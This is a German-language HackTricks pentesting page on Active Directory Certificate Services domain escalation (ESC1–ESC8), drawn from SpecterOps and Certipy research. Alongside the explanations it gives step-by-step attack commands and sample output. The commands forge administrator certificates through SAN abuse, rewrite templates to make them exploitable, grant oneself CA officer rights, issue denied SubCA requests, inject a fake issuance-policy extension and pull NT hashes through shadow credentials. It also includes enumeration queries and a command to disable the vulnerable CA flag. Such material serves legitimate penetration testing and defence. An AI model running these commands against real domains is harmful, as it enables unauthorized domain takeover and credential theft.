# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Abschnitte zu Escalation-Techniken aus den Beiträgen:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Certificate Templates - ESC1

### Erklärung

### Fehlkonfigurierte Certificate Templates - ESC1 erklärt

- **Die Enterprise CA gewährt nicht privilegierten Benutzern Enrolment-Rechte.**
- **Eine Genehmigung durch einen Manager ist nicht erforderlich.**
- **Es sind keine Signaturen durch autorisierte Personen erforderlich.**
- **Die Security Descriptors der Certificate Templates sind zu weit gefasst und ermöglichen es nicht privilegierten Benutzern, Enrolment-Rechte zu erhalten.**
- **Die Certificate Templates sind so konfiguriert, dass sie EKUs definieren, die die Authentifizierung ermöglichen:**
- Extended Key Usage (EKU)-Kennungen wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder keine EKU (SubCA) sind enthalten.
- **Das Einfügen eines subjectAltName in den Certificate Signing Request (CSR) durch Antragsteller wird vom Template erlaubt:**
- Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat zur Identitätsüberprüfung, sofern dieser vorhanden ist. Das bedeutet, dass durch die Angabe des SAN in einem CSR ein Zertifikat angefordert werden kann, um sich als beliebiger Benutzer (z. B. ein Domainadministrator) auszugeben. Ob ein SAN vom Antragsteller angegeben werden kann, wird im AD-Objekt des Certificate Templates über die Eigenschaft `mspki-certificate-name-flag` festgelegt. Diese Eigenschaft ist eine Bitmaske, und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt die Angabe des SAN durch den Antragsteller.

> [!CAUTION]
> Die beschriebene Konfiguration ermöglicht es nicht privilegierten Benutzern, Zertifikate mit einem beliebigen SAN ihrer Wahl anzufordern und sich dadurch über Kerberos oder SChannel als beliebiger Domain Principal zu authentifizieren.

Diese Funktion ist manchmal aktiviert, um die On-the-fly-Generierung von HTTPS- oder Host-Zertifikaten durch Produkte oder Deployment-Services zu unterstützen, oder aufgrund mangelnden Verständnisses.

Es wird darauf hingewiesen, dass die Erstellung eines Zertifikats mit dieser Option eine Warnung auslöst. Dies ist nicht der Fall, wenn ein vorhandenes Certificate Template (z. B. das `WebServer`-Template, bei dem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und anschließend so geändert wird, dass eine Authentication-OID enthalten ist.<sup>[[6]](#references)</sup>

### Abuse

Um **verwundbare Certificate Templates zu finden**, kannst du Folgendes ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um **diese Schwachstelle zu missbrauchen und sich als Administrator auszugeben**, könnte man Folgendes ausführen:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dann kannst du das erzeugte **Zertifikat in das `.pfx`**-Format umwandeln und es erneut zur **Authentifizierung mit Rubeus oder certipy** verwenden:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binärdateien „Certreq.exe“ und „Certutil.exe“ können zum Erzeugen der PFX-Datei verwendet werden: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Enumeration von Zertifikatvorlagen innerhalb des Konfigurationsschemas der AD Forest, insbesondere von Vorlagen, die keine Genehmigung oder Signaturen erfordern, über eine Client Authentication- oder Smart Card Logon-EKU verfügen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist, kann durch Ausführen der folgenden LDAP-Abfrage erfolgen:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Certificate Templates - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Enrollment-Rechte werden vom Enterprise CA an Benutzer mit niedrigen Berechtigungen vergeben.
2. Die Anforderung einer Genehmigung durch einen Manager ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen ist nicht gegeben.
4. Ein übermäßig permissiver Security Descriptor auf dem Certificate Template gewährt Benutzern mit niedrigen Berechtigungen Enrollment-Rechte für Zertifikate.
5. **Das Certificate Template ist so definiert, dass es die Any Purpose EKU oder keine EKU enthält.**

Die **Any Purpose EKU** ermöglicht es einem Angreifer, ein Zertifikat für **jeden beliebigen Zweck** zu erhalten, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code-Signing usw. Dieselbe **für ESC3 verwendete Technik** kann zur Ausnutzung dieses Szenarios eingesetzt werden.

Zertifikate **ohne EKUs**, die als Subordinate-CA-Zertifikate fungieren, können für **jeden beliebigen Zweck** ausgenutzt und **auch zum Signieren neuer Zertifikate verwendet werden**. Daher könnte ein Angreifer mithilfe eines Subordinate-CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten festlegen.

Neue Zertifikate, die für die **Domain-Authentifizierung** erstellt wurden, funktionieren jedoch nicht, wenn die Subordinate CA nicht vom **`NTAuthCertificates`**-Objekt als vertrauenswürdig eingestuft wird, was der Standardeinstellung entspricht. Dennoch kann ein Angreifer **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten potenziell für eine Vielzahl von Zwecken (z. B. Code-Signing, Server-Authentifizierung usw.) **missbraucht** werden und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.<sup>[[6]](#references)</sup>

Um Templates zu enumerieren, die diesem Szenario im Konfigurationsschema des AD Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrollment Agent Templates - ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, missbraucht jedoch eine **andere EKU** (Certificate Request Agent) und **2 verschiedene Templates** (und hat daher 2 Anforderungssätze).

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, ermöglicht es einem Principal, ein **Zertifikat** **für einen anderen Benutzer** zu **beantragen**.

Der **„Enrollment Agent“** beantragt ein solches **Template** und verwendet das daraus resultierende **Zertifikat, um eine CSR im Namen des anderen Benutzers mit zu signieren**. Anschließend **sendet** er die **mit signierte CSR** an die CA und beantragt ein **Template**, das **„enroll on behalf of“** erlaubt. Die CA antwortet mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.<sup>[[6]](#references)</sup>

**Anforderungen 1:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Anforderung einer Genehmigung durch den Manager ist deaktiviert.
- Es ist keine Anforderung autorisierter Signaturen vorhanden.
- Der Security Descriptor des Certificate Templates ist übermäßig permissiv und gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Das Certificate Template enthält die Certificate Request Agent EKU und ermöglicht dadurch, andere Certificate Templates im Namen anderer Principals anzufordern.

**Anforderungen 2:**

- Die Enterprise CA gewährt Benutzern mit geringen Berechtigungen Enrollment-Rechte.
- Die Genehmigung durch den Manager wird umgangen.
- Die Schema-Version des Templates ist entweder 1 oder höher als 2, und es gibt eine Application Policy Issuance Requirement an, die die Certificate Request Agent EKU voraussetzt.
- Eine im Certificate Template definierte EKU erlaubt die Domain-Authentifizierung.
- Auf der CA sind keine Einschränkungen für Enrollment Agents konfiguriert.

### Missbrauch

Du kannst [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die ein **Zertifikat für einen enrollment agent erhalten** dürfen, die Vorlagen, in denen enrollment **agents** enrollen dürfen, sowie die **Konten**, in deren Namen der enrollment agent handeln darf, können durch Enterprise-CAs eingeschränkt werden. Dies wird erreicht, indem das `certsrc.msc`-**snap-in** geöffnet, auf die **CA rechtsgeklickt**, auf **Eigenschaften** geklickt und anschließend zum Tab „Enrollment Agents“ **navigiert** wird.

Es wird jedoch darauf hingewiesen, dass die **Standardeinstellung** für CAs „**Do not restrict enrollment agents**“ lautet. Wenn Administratoren die Einschränkung für enrollment agents aktivieren, indem sie „Restrict enrollment agents“ auswählen, bleibt die Standardkonfiguration äußerst permissiv. Sie ermöglicht **Everyone** den Zugriff, sich in allen Vorlagen als beliebige Identität zu enrollen.

## Vulnerable Certificate Template Access Control - ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** für **Zertifikatvorlagen** definiert die **Berechtigungen**, die bestimmte **AD-Principals** in Bezug auf die Vorlage besitzen.

Verfügt ein **Angreifer** über die erforderlichen **Berechtigungen**, eine **Vorlage** zu **ändern** und eine der in den **vorherigen Abschnitten** beschriebenen **ausnutzbaren Fehlkonfigurationen** zu **implementieren**, kann dies eine Privilege Escalation ermöglichen.

Zu den wichtigen Berechtigungen für Zertifikatvorlagen gehören:<sup>[[6]](#references)</sup>

- **Owner:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
- **FullControl:** Ermöglicht vollständige Kontrolle über das Objekt, einschließlich der Möglichkeit, beliebige Attribute zu ändern.
- **WriteOwner:** Erlaubt die Änderung des Besitzers des Objekts zu einem Principal unter der Kontrolle des Angreifers.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen und kann einem Angreifer dadurch FullControl gewähren.
- **WriteProperty:** Erlaubt die Bearbeitung beliebiger Objekteigenschaften.

### Missbrauch

Um Principals mit Bearbeitungsrechten für Vorlagen und andere PKI-Objekte zu identifizieren, kann mit Certify enumeriert werden:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ein Beispiel für einen privesc wie beim vorherigen:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 liegt vor, wenn ein Benutzer Schreibberechtigungen für eine certificate template besitzt. Dies kann beispielsweise ausgenutzt werden, um die Konfiguration der certificate template zu überschreiben und sie dadurch für ESC1 anfällig zu machen.

Wie wir im obigen Pfad sehen können, besitzt nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` hat die neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert. Er ist als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt.<sup>[[8]](#references)</sup> Hier ist ein kleiner Einblick in den Befehl `shadow auto` von Certipy, mit dem der NT hash des Opfers abgerufen wird.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer certificate template mit einem einzigen Befehl überschreiben. **Standardmäßig** überschreibt Certipy die **Konfiguration**, um sie **anfällig für ESC1** zu machen. Wir können außerdem den **Parameter `-save-old` angeben, um die alte Konfiguration zu speichern**, was für das **Wiederherstellen** der Konfiguration nach unserem Angriff nützlich ist.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Zugriffskontrolle für verwundbare PKI-Objekte - ESC5

### Erklärung

Das umfangreiche Netz miteinander verbundener ACL-basierter Beziehungen, das mehrere Objekte neben Certificate Templates und der Certificate Authority umfasst, kann die Sicherheit des gesamten AD CS-Systems beeinflussen. Zu diesen Objekten, die die Sicherheit erheblich beeinträchtigen können, gehören:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes untergeordnete AD-Objekt oder jeder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Certificate Templates-Container, den Certification Authorities-Container, das NTAuthCertificates-Objekt und den Enrollment Services Container.

Die Sicherheit des PKI-Systems kann kompromittiert werden, wenn es einem Angreifer mit geringen Berechtigungen gelingt, die Kontrolle über eine dieser kritischen Komponenten zu erlangen.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erklärung

Das im [**CQure Academy-Beitrag**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Thema geht ebenfalls auf die Auswirkungen des **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-Flags ein, wie von Microsoft beschrieben. Diese Konfiguration ermöglicht bei Aktivierung auf einer Certification Authority (CA) die Aufnahme von **benutzerdefinierten Werten** in den **Subject Alternative Name** für **jede Anfrage**, einschließlich solcher, die aus Active Directory® erstellt werden. Dadurch kann sich ein **Angreifer** über **jedes Template** registrieren, das für die Domain-**Authentifizierung** eingerichtet ist – insbesondere über solche, die die Registrierung durch **nicht privilegierte** Benutzer erlauben, wie das standardmäßige User-Template. Infolgedessen kann ein Zertifikat erlangt werden, mit dem sich der Angreifer als Domain-Administrator oder als **jede andere aktive Entität** innerhalb der Domain authentifizieren kann.<sup>[[9]](#references)</sup>

**Hinweis**: Die Methode zum Anhängen von **alternativen Namen** an einen Certificate Signing Request (CSR) über das Argument `-attrib "SAN:"` in `certreq.exe` (bezeichnet als „Name Value Pairs“) unterscheidet sich von der Exploitation-Strategie für SANs in ESC1. Der Unterschied liegt darin, **wie Kontoinformationen gekapselt werden** – innerhalb eines Zertifikatattributs und nicht innerhalb einer Extension.

### Ausnutzung

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Dieser Vorgang nutzt im Wesentlichen **Remote-Registrierungszugriff**. Daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, kann der folgende Befehl von jeder Workstation aus ausgeführt werden, sofern man über **Domänenadministratorrechte** oder gleichwertige Berechtigungen verfügt:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das Flag mit Folgendem entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nach den Sicherheitsupdates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die **`objectSid`-Eigenschaft des Antragstellers** einbezieht. Bei ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** entspricht die SID jedoch der **`objectSid` des Antragstellers** und nicht dem SAN.\
> Um ESC6 auszunutzen, muss das System für ESC10 (schwache Zertifikatzuordnungen) anfällig sein, wobei der **SAN gegenüber der neuen Sicherheitserweiterung** priorisiert wird.

## Anfällige Zugriffssteuerung der Zertifizierungsstelle - ESC7

### Angriff 1

#### Erklärung

Die Zugriffssteuerung für eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen geregelt, die die Aktionen der CA bestimmen. Diese Berechtigungen können über `certsrv.msc` angezeigt werden, indem Sie mit der rechten Maustaste auf eine CA klicken, Eigenschaften auswählen und anschließend zum Tab „Sicherheit“ navigieren. Zusätzlich können Berechtigungen mithilfe des PSPKI-Moduls und Befehlen wie den folgenden aufgelistet werden:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies liefert Einblicke in die primären Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die jeweils den Rollen „CA administrator“ und „Certificate Manager“ entsprechen.<sup>[[6]](#references)</sup>

#### Abuse

**`ManageCA`**-Rechte für eine certificate authority ermöglichen es dem Principal, Einstellungen remote mit PSPKI zu manipulieren. Dazu gehört das Aktivieren des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe von SAN in jedem Template zu erlauben – ein kritischer Aspekt der domain escalation.

Dieser Prozess lässt sich durch die Verwendung des PSPKI-Cmdlets **Enable-PolicyModuleFlag** vereinfachen, wodurch Änderungen ohne direkte Interaktion mit der GUI möglich sind.

**`ManageCertificates`**-Rechte ermöglichen die Genehmigung ausstehender Requests und umgehen damit effektiv die Sicherheitsmaßnahme „CA certificate manager approval“.

Eine Kombination aus den Modulen **Certify** und **PSPKI** kann verwendet werden, um ein certificate anzufordern, zu genehmigen und herunterzuladen:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

> [!WARNING]
> Im **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um das Flag **EDITF_ATTRIBUTESUBJECTALTNAME2** zu **aktivieren** und den **ESC6-Angriff** durchzuführen. Dies hat jedoch keine Wirkung, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer über das Zugriffsrecht **`Manage CA`** verfügt, ist er auch berechtigt, den **Dienst neu zu starten**. Das bedeutet jedoch **nicht, dass der Benutzer den Dienst remote neu starten kann**. Außerdem funktioniert E**SC6 in den meisten gepatchten Umgebungen möglicherweise nicht standardmäßig**, da die Sicherheitsupdates vom Mai 2022 installiert wurden.

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

- Nur die Berechtigung **`ManageCA`**
- Die Berechtigung **`Manage Certificates`** (kann über **`ManageCA`** erteilt werden)
- Das Zertifikat-Template **`SubCA`** muss **aktiviert** sein (kann über **`ManageCA`** aktiviert werden)

Die Technik basiert auf der Tatsache, dass Benutzer mit den Zugriffsrechten `Manage CA` _und_ `Manage Certificates` **abgelehnte Zertifikatanforderungen ausstellen** können. Das Zertifikat-Template **`SubCA`** ist für **ESC1** **anfällig**, aber **nur Administratoren** können sich für das Template registrieren. Daher kann ein **Benutzer** die Registrierung für **`SubCA`** **anfordern** – was **abgelehnt** wird –, die Anforderung kann jedoch **anschließend vom Manager ausgestellt werden**.<sup>[[6]](#references)</sup>

#### Ausnutzung

Du kannst dir das Zugriffsrecht **`Manage Certificates`** erteilen, indem du deinen Benutzer als neuen Genehmiger hinzufügst.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-Vorlage kann auf der **CA** mit dem Parameter `-enable-template` **aktiviert** werden. Standardmäßig ist die `SubCA`-Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir beginnen, indem wir **ein Zertifikat auf Basis des `SubCA`-Templates anfordern**.

**Diese Anfrage wird abgelehnt**, aber wir speichern den privaten Schlüssel und notieren uns die Request-ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unseren Berechtigungen **`Manage CA` und `Manage Certificates`** können wir die **fehlgeschlagene Zertifikatsanforderung** anschließend mit dem `ca`-Befehl und dem Parameter `-issue-request <request ID>` ausstellen.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir das **ausgestellte Zertifikat** mit dem Befehl `req` und dem Parameter `-retrieve <request ID>` **abrufen**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Erklärung

Zusätzlich zu den klassischen ESC7-Abuses (Aktivieren von EDITF-Attributen oder Genehmigen ausstehender Anfragen) enthüllte **Certify 2.0** ein völlig neues Primitive, das lediglich die Rolle *Manage Certificates* (auch **Certificate Manager / Officer**) auf der Enterprise CA erfordert.<sup>[[3]](#references)</sup>

Die RPC-Methode `ICertAdmin::SetExtension` kann von jedem Principal ausgeführt werden, der über *Manage Certificates* verfügt. Während die Methode traditionell von legitimen CAs verwendet wurde, um Extensions für **ausstehende** Anfragen zu aktualisieren, kann ein Angreifer sie missbrauchen, um eine *nicht standardmäßige* Certificate Extension (beispielsweise eine benutzerdefinierte *Certificate Issuance Policy*-OID wie `1.1.1.1`) an eine auf Genehmigung wartende Anfrage anzuhängen.

Da das Ziel-Template keinen Standardwert für diese Extension definiert, wird die vom Angreifer kontrollierte Value von der CA **NICHT** überschrieben, wenn die Anfrage schließlich ausgestellt wird. Das resultierende Zertifikat enthält daher eine vom Angreifer gewählte Extension, die Folgendes ermöglichen kann:

* Anforderungen an Application / Issuance Policies anderer verwundbarer Templates erfüllen (was zu einer Privilege Escalation führt).
* Zusätzliche EKUs oder Policies einschleusen, die dem Zertifikat unerwartetes Vertrauen in Drittanbietersystemen verleihen.

Kurz gesagt: *Manage Certificates* – bislang als die „weniger mächtige“ Hälfte von ESC7 betrachtet – kann nun für eine vollständige Privilege Escalation oder langfristige Persistence genutzt werden, ohne die CA-Konfiguration zu verändern oder das restriktivere *Manage CA*-Recht zu benötigen.

#### Missbrauch des Primitives mit Certify 2.0

1. **Eine Certificate Request einreichen, die *pending* bleibt.** Dies kann mit einem Template erzwungen werden, das eine Manager-Genehmigung erfordert:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Eine benutzerdefinierte Extension an die ausstehende Anfrage anhängen**, indem der neue `manage-ca`-Befehl verwendet wird:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Wenn das Template die *Certificate Issuance Policies*-Extension nicht bereits definiert, bleibt der obige Wert nach der Ausstellung erhalten.*

3. **Die Anfrage ausstellen** (falls deine Rolle ebenfalls über Genehmigungsrechte für *Manage Certificates* verfügt) oder auf die Genehmigung durch einen Operator warten. Nach der Ausstellung das Zertifikat herunterladen:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Das resultierende Zertifikat enthält nun die schädliche Issuance-Policy-OID und kann für nachfolgende Angriffe verwendet werden (z. B. ESC13, domain escalation usw.).

> HINWEIS: Derselbe Angriff kann mit Certipy ≥ 4.7 über den Befehl `ca` und den Parameter `-set-extension` ausgeführt werden.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Erklärung

> [!TIP]
> Wenn in Umgebungen **AD CS installiert** ist, ein **verwundbarer Web-enrollment-Endpunkt** vorhanden ist und mindestens ein **Certificate Template veröffentlicht** wurde, das die Enrollment durch Domain Computer sowie Client Authentication erlaubt (beispielsweise das standardmäßige **`Machine`**-Template), wird es möglich, **jeden Computer mit aktivem Spooler Service durch einen Angreifer zu kompromittieren**!

AD CS unterstützt mehrere **HTTP-basierte Enrollment-Methoden**, die über zusätzliche Serverrollen bereitgestellt werden, die Administratoren installieren können. Diese Interfaces für HTTP-basiertes Certificate Enrollment sind anfällig für **NTLM Relay-Angriffe**. Ein Angreifer kann sich von einer **kompromittierten Maschine aus als jedes AD-Konto ausgeben, das sich über eingehendes NTLM authentifiziert**. Während der Angreifer das Opferkonto imitiert, können diese Web-Interfaces verwendet werden, um mithilfe der Certificate Templates `User` oder `Machine` ein Client-Authentication-Zertifikat anzufordern.

- Das **Web-enrollment-Interface** (eine ältere ASP-Anwendung unter `http://<caserver>/certsrv/`) verwendet standardmäßig ausschließlich HTTP, das keinen Schutz gegen NTLM Relay-Angriffe bietet. Außerdem erlaubt es über seinen Authorization-HTTP-Header ausdrücklich nur NTLM-Authentifizierung, wodurch sicherere Authentifizierungsmethoden wie Kerberos nicht anwendbar sind.
- Der **Certificate Enrollment Service** (CES), der **Certificate Enrollment Policy** (CEP) Web Service und der **Network Device Enrollment Service** (NDES) unterstützen standardmäßig Negotiate-Authentifizierung über ihren Authorization-HTTP-Header. Die Negotiate-Authentifizierung unterstützt sowohl **Kerberos** als auch **NTLM**, wodurch ein Angreifer während Relay-Angriffen auf NTLM-Authentifizierung **downgraden** kann. Obwohl diese Web-Services standardmäßig HTTPS aktivieren, bietet HTTPS allein **keinen Schutz gegen NTLM Relay-Angriffe**. Der Schutz von HTTPS-Services gegen NTLM Relay-Angriffe ist nur möglich, wenn HTTPS mit Channel Binding kombiniert wird. Bedauerlicherweise aktiviert AD CS die Extended Protection for Authentication in IIS nicht, die für Channel Binding erforderlich ist.<sup>[[6]](#references)</sup>

